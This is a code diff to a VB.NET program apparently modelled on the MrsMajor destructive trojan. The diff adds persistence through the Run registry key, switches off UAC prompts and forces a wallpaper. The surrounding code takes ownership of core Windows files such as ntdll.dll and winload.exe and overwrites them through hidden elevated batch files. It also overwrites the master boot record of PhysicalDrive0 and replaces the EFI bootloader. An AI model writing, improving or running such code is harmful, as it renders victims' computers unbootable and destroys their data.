@@ -87,6 +87,24 @@ Module Program
     End Sub
 
     Sub Main()
+        ' Add application to startup
+        Try
+            Dim startupKey As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
+            startupKey.SetValue("MrsMajor5", Application.ExecutablePath)
+            startupKey.Close()
+        Catch ex As Exception
+            Console.WriteLine("Error adding application to startup: " & ex.Message)
+        End Try
+
+        ' Set EnableLUA to 0 to disable UAC prompts
+        Try
+            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
+            reg.SetValue("EnableLUA", 0)
+            reg.Close()
+        Catch ex As Exception
+            Console.WriteLine("Error setting EnableLUA registry value: " & ex.Message)
+        End Try
+
         ' Initial registry modifications
         Try
             Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
@@ -102,6 +120,24 @@ Module Program
             reg.Close()
         Catch ex As Exception
             Console.WriteLine("Error modifying Policies\system registry: " & ex.Message)
+        End Try
+
+        Try
+            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop")
+            reg.SetValue("NoChangingWallpaper", 0)
+            reg.Close()
+        Catch ex As Exception
+            Console.WriteLine("Error modifying Policies\ActiveDesktop registry back to 0: " & ex.Message)
+        End Try
+
+        ' Set wallpaper and disable changing it
+        Try
+            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Control Panel\Desktop")
+            reg.SetValue("Wallpaper", "Resources1\MrsMajor5.png")
+            reg.SetValue("WallpaperStyle", 2) ' Center wallpaper
+            reg.Close()
+        Catch ex As Exception
+            Console.WriteLine("Error setting wallpaper: " & ex.Message)
         End Try
 
         Try
@@ -187,17 +223,19 @@ Module Program
             Else
                 ' If file exists, continue with resource-related tasks
                 Dim files2owr() As String = {"winload.exe", "csrss.exe", "wininit.exe", "wininet.dll", "aclui.dll", "ADVAPI32.DLL", "crypt32.dll", "hal.dll", "logonui.exe", "ntdll.dll", "cryptbase.dll", "kernel32.dll", "userinit.exe", "crypt.dll", "chkdsk.exe"}
+                Dim currentDirectory As String = Environment.CurrentDirectory
+                Dim username As String = Environment.GetEnvironmentVariable("username")
+
                 For Each fileName In files2owr
-                    ' Overwrite files using batch
-                    Dim currentDirectory As String = Environment.CurrentDirectory
-                    Dim username As String = Environment.GetEnvironmentVariable("username")
+                    ' Create the batch file for each file
                     Dim text As String = "@echo off" & vbNewLine & "cd %windir%\System32" & vbNewLine & "takeown /f " & fileName & vbNewLine & "icacls " & fileName & "/grant """ & username & """:F" & vbNewLine & "echo xa > """ & fileName & """"
-                    File.WriteAllText("taskOverwrite.bat", text)
+                    Dim batchFilePath As String = Path.Combine(currentDirectory, "taskOverwrite_" & fileName & ".bat")
+                    File.WriteAllText(batchFilePath, text)
 
                     Try
                         Dim prc As New Process
                         prc.StartInfo.FileName = "cmd.exe"
-                        prc.StartInfo.Arguments = "/c """ & currentDirectory & "\taskOverwrite.bat"""
+                        prc.StartInfo.Arguments = "/c """ & batchFilePath & """"
                         prc.StartInfo.Verb = "runas"
                         prc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                         prc.Start()
@@ -207,9 +245,9 @@ Module Program
                 Next
 
                 ' Perform resource-related operations
-                WriteMBR("Resources\mrsmajor5mbr.bin", "\\.\PhysicalDrive0")
+                WriteMBR("Resources1\mrsmajor5mbr.bin", "\\.\PhysicalDrive0")
                 RunCommand("mountvol x: /s")
-                ExtractAndCopyEFI("Resources\bootmgfw.efi", "X:\EFI\Boot\Microsoft\bootmgfw.efi")
+                ExtractAndCopyEFI("Resources1\bootmgfw.efi", "X:\EFI\Boot\Microsoft\bootmgfw.efi")
 
                 ' Show message box after resource tasks are done
                 MsgBox("You messed up... But if you don't click this message nothing's going to happen.", MsgBoxStyle.Critical, "uh oh")
